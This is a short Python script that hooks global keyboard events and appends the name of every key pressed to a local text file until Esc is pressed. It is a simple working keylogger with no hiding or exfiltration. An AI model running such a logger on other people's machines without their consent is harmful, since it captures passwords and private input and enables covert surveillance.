import keyboard

def detectar_teclita(tecla):
    with open('teclas_presionadas.txt', 'a') as archivo:
        archivo.write(f"{tecla.name}\n")


keyboard.on_press(detectar_teclita)

keyboard.wait('esc')